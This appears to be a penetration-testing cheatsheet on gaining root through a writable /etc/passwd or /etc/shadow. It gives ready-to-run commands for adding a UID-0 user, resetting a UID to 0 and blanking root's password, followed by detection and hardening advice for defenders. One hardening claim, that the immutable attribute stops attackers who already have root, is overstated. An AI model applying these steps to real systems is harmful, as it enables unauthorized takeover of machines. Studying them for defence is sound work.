## 🗃️ Cheatsheet: Writable /etc/passwd & /etc/shadow

The `/etc/passwd` file stores user account information, and `/etc/shadow` stores the hashed passwords. If an attacker can write to `/etc/passwd`, they can create a new user with root privileges, change their own user ID to root, or remove a user's password entirely. It's a direct and devastatingly effective path to privilege escalation.

### ## What to Look For (Reconnaissance)

This vulnerability is incredibly easy to spot. The attacker just needs to check the permissions of two files.

* **Check File Permissions:**
    ```bash
    ls -l /etc/passwd
    ls -l /etc/shadow
    ```
* **What to Look For:**
    * **`/etc/passwd`:** The correct permission is `644` (`-rw-r--r--`). If you see write permissions for the "group" or "others" (e.g., `-rw-rw-r--` or `-rw-rw-rw-`), the file is vulnerable.
    * **`/etc/shadow`:** The correct permission is `640` (`-rw-r-----`) or stricter (`600`). If anyone other than the `root` user or `shadow` group can read or write to this file, it's a critical vulnerability.

---

### ## Common Exploitable Scenarios & Payloads

If `/etc/passwd` is writable, an attacker has several ways to become root.

#### **Scenario 1: Writable `/etc/passwd` (Most Common)**
The structure of a line in `/etc/passwd` is: `username:password:UID:GID:comment:home_dir:shell`. The `password` field is an `x` placeholder, indicating the real hash is in `/etc/shadow`.

* **Method A: Add a New Root User**
    1.  **Generate a password hash.** An attacker can use OpenSSL to create a compatible hash.
        ```bash
        # The '-salt' can be any short string
        openssl passwd -1 -salt attack 'password123'
        # Output: $1$attack$p1Vd2k2I72o7Yd11N1Y10/
        ```
    2.  **Craft the new user line.** The key is setting the **UID and GID to 0**, which is root.
        ```
        newroot:$1$attack$p1Vd2k2I72o7Yd11N1Y10/:0:0:New Root:/root:/bin/bash
        ```
    3.  **Append the line to `/etc/passwd`** and switch to the new user.
        ```bash
        echo "newroot:\$1\$attack\$p1Vd2k2I72o7Yd11N1Y10/:0:0:New Root:/root:/bin/bash" >> /etc/passwd
        su newroot
        # Enter 'password123'
        whoami
        # Output: root
        ```

* **Method B: Change Your UID to 0**
    If you are logged in as a user (e.g., `attacker` with UID `1001`), you can simply edit the file to change your UID to `0`. The next time you log in, you will be root.
    ```bash
    # Find your line: attacker:x:1001:1001::/home/attacker:/bin/bash
    # Change it to:   attacker:x:0:0::/home/attacker:/bin/bash
    ```

* **Method C: Blank Root's Password**
    This is noisy but effective. By removing the `x` from root's entry, you tell the system there is no password.
    ```bash
    # Change: root:x:0:0:root:/root:/bin/bash
    # To:     root::0:0:root:/root:/bin/bash
    ```
    You can then `su root` without a password.

#### **Scenario 2: Writable `/etc/shadow`**
If `/etc/shadow` is writable, an attacker can replace root's password hash with their own known hash.

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **File Integrity Monitoring (FIM):** This is the **most critical defense**. Tools like **AIDE**, **Tripwire**, or **Wazuh** must be configured to monitor `/etc/passwd` and `/etc/shadow`. Any change to these files should trigger an immediate, high-priority security alert.
* **Audit Logs:** Configure system auditing (`auditd`) to log all write access to these files and review the logs.

#### **How to Prevent This Vulnerability**

* **Enforce Correct Permissions:** This is the primary fix. Ensure permissions are set correctly and audit them regularly.
    ```bash
    # Correct permissions for /etc/passwd
    sudo chown root:root /etc/passwd
    sudo chmod 644 /etc/passwd

    # Correct permissions for /etc/shadow
    sudo chown root:shadow /etc/shadow
    sudo chmod 640 /etc/shadow
    ```
* **Use the Immutable Attribute:** As a powerful hardening step, make the files immutable. This prevents **everyone**, including root, from modifying them until the attribute is removed. This stops attackers even if they gain root through another method.
    ```bash
    # Make files immutable
    sudo chattr +i /etc/passwd
    sudo chattr +i /etc/shadow

    # To make changes later, you must first remove the attribute
    # sudo chattr -i /etc/passwd
    ```
* **Regular Audits:** Run a simple script or cron job that checks the permissions of these files and alerts you if they are ever changed from the secure baseline.
